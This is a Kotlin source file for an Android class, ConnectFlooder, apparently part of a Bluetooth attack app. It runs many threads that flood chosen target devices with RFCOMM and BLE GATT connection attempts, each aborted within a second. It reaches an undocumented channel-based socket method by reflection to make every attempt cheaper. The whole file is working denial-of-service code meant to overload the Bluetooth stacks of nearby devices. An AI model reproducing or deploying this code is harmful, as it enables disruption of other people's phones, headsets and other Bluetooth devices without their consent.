package com.komugi.attacker.ble

import android.Manifest
import android.annotation.SuppressLint
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothGatt
import android.bluetooth.BluetoothGattCallback
import android.bluetooth.BluetoothSocket
import android.content.Context
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat
import java.io.IOException
import java.util.UUID
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicLong

/**
 * Hammers one target with link attempts.
 *
 * Two paths run per worker: a channel level RFCOMM connect (fast, no SDP round trip) and a
 * GATT connect on the LE transport. Both are aborted as soon as they land or time out, so
 * the remote stack keeps seeing fresh inbound requests instead of one held link.
 */
@SuppressLint("MissingPermission")
class ConnectFlooder(
    private val context: Context,
    private val targetsProvider: () -> List<BluetoothDevice>,
    private val threadCount: Int,
) {

    private val running = AtomicBoolean(false)
    private val attempts = AtomicLong(0)
    private val failures = AtomicLong(0)
    private var pool: java.util.concurrent.ExecutorService? = null
    private var scheduler: ScheduledExecutorService? = null

    private val gattCallbacks = object : BluetoothGattCallback() {
        override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
            runCatching { gatt.close() }
        }
    }

    fun start() {
        if (!running.compareAndSet(false, true)) return
        if (!hasPermission()) {
            SpamState.log("flood: missing BLUETOOTH_CONNECT permission")
            running.set(false)
            return
        }
        val workers = threadCount.coerceIn(SpamConfig.MIN_THREADS, SpamConfig.MAX_THREADS)
        pool = Executors.newFixedThreadPool(workers) { r ->
            Thread(r, "komugi-flood").apply { isDaemon = true }
        }
        scheduler = Executors.newScheduledThreadPool(1) { r ->
            Thread(r, "komugi-abort").apply { isDaemon = true }
        }
        SpamState.log("flood: $workers workers armed")
        repeat(workers) { index -> pool?.execute { workerLoop(index) } }
    }

    fun stop() {
        if (!running.compareAndSet(true, false)) return
        pool?.shutdownNow()
        scheduler?.shutdownNow()
        pool = null
        scheduler = null
        SpamState.log("flood: stopped after ${attempts.get()} attempts")
    }

    private fun workerLoop(index: Int) {
        var channel = 1 + (index % 30)
        var round = 0
        while (running.get()) {
            val targets = targetsProvider()
            if (targets.isEmpty()) {
                Thread.sleep(400)
                continue
            }
            val device = targets[round % targets.size]
            round++
            if (round % 3 == 0) {
                gattAttempt(device)
            } else {
                channel = (channel % 30) + 1
                rfcommAttempt(device, channel)
            }
        }
    }

    private fun rfcommAttempt(device: BluetoothDevice, channel: Int) {
        val socket = openSocket(device, channel)
        if (socket == null) {
            failures.incrementAndGet()
            SpamState.failure("rfcomm ch$channel")
            return
        }
        val aborted = AtomicBoolean(false)
        scheduler?.schedule({
            aborted.set(true)
            runCatching { socket.close() }
        }, CONNECT_TIMEOUT_MS, TimeUnit.MILLISECONDS)

        val started = System.nanoTime()
        try {
            socket.connect()
            attempts.incrementAndGet()
            SpamState.packet("linked ${device.address} ch$channel")
        } catch (io: IOException) {
            failures.incrementAndGet()
            if (!aborted.get()) {
                SpamState.failure("rfcomm ${device.address} ch$channel")
            } else {
                SpamState.packet("timeout ${device.address} ch$channel")
            }
        } finally {
            runCatching { socket.close() }
        }
        val elapsedMs = (System.nanoTime() - started) / 1_000_000
        if (elapsedMs < 40) Thread.sleep(40 - elapsedMs)
    }

    /**
     * Channel based connects skip the SDP round trip, which makes them far cheaper per
     * attempt. The channel overload is not part of the public SDK on recent platform
     * levels, so it is reached reflectively and falls back to a UUID based socket.
     */
    private fun openSocket(device: BluetoothDevice, channel: Int): BluetoothSocket? {
        val direct = runCatching {
            device.javaClass
                .getMethod("createInsecureRfcommSocket", Int::class.javaPrimitiveType)
                .invoke(device, channel) as? BluetoothSocket
        }.getOrNull()
        if (direct != null) return direct
        return runCatching {
            device.createInsecureRfcommSocketToServiceRecord(SPP_UUID)
        }.getOrNull()
    }

    private fun gattAttempt(device: BluetoothDevice) {
        val gatt = runCatching {
            device.connectGatt(context, false, gattCallbacks, BluetoothDevice.TRANSPORT_LE)
        }.getOrNull()
        if (gatt == null) {
            failures.incrementAndGet()
            SpamState.failure("gatt ${device.address}")
            return
        }
        attempts.incrementAndGet()
        SpamState.packet("gatt ${device.address}")
        scheduler?.schedule({ runCatching { gatt.close() } }, GATT_HOLD_MS, TimeUnit.MILLISECONDS)
    }

    private fun hasPermission(): Boolean {
        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.S) return true
        return ContextCompat.checkSelfPermission(context, Manifest.permission.BLUETOOTH_CONNECT) ==
            PackageManager.PERMISSION_GRANTED
    }

    companion object {
        private const val CONNECT_TIMEOUT_MS = 900L
        private const val GATT_HOLD_MS = 250L
        val SPP_UUID: UUID = UUID.fromString("00001101-0000-1000-8000-00805F9B34FB")
    }
}
